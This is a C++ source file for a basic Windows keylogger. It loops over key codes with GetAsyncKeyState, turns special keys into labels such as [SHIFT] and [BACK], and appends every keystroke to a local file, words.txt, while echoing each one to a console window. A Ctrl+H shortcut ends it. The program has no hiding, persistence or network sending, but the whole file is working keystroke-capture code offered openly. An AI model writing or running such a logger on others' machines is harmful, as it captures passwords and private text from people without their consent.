// KeyLogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <Windows.h>
#include <iostream>
#include <conio.h>
#include <fstream>
using namespace std;

string specialChar(int keyCode){
	switch(keyCode){
		case VK_CAPITAL:
			return  "[CAPS]";

		case VK_TAB:
			return  "[TAB]";

		case VK_UP:
			return "[UP]";

		case VK_DOWN:
			return  "[DOWN]";

		case VK_SPACE:
			return " ";

		case VK_RETURN:
			return "\n";
		case VK_SHIFT:
			return "[SHIFT]";
		case VK_BACK:
			return "[BACK]";
		case VK_RBUTTON:
			return  "[RIGHT_CLICK]";
		case VK_LEFT:
			return  "[LEFT]";

		case VK_RIGHT:
			return  "[RIGHT]";

		case VK_CONTROL:
			return  "[CONTROL]";

		case VK_MENU:
			return  "[ALT]";
			;
		default:
			return "false";
	}
}

void addToFile(string letter){
	fstream file;
	file.open("words.txt",fstream::out | fstream::app);
	if (file.is_open()){
		cout<<letter<<endl;
		file<<letter;
		file.close();
	}else{
		cout<<"file does not exist"<<endl;
	}
}
void findLetterEfficient(){

	while (1){
		string currentSentence = "";
		for(int i=8;i<=190;i++){
			if(GetAsyncKeyState(i) & 1){
				if(specialChar(i) == "false"){
					currentSentence+=char(i);
					addToFile(currentSentence);
				}else{
					addToFile(specialChar(i));
				}

			}
			if ((GetAsyncKeyState(VK_CONTROL) & 1) && (GetAsyncKeyState(0x48)) & 1){ //Ctrl + H To Exit
				cout<<"Goodbye"<<endl;
				return;
			}
		}
		// if (GetAsyncKeyState(VK_RETURN) & 0x8000) { //Return to Print Line
		// 	cout << currentSentence << endl;
		// 	file<<currentSentence;
		// 	currentSentence = "";
		// }
		// if ((GetAsyncKeyState(VK_CONTROL) & 1) && (GetAsyncKeyState(0x48)) & 1){ //Ctrl + H To Exit
		// 	cout<<"Goodbye"<<endl;
		// 	file.close();
		// 	return;
		// }
	}
}


int main(){
	Sleep(1);
	findLetterEfficient();
	return 0;
}
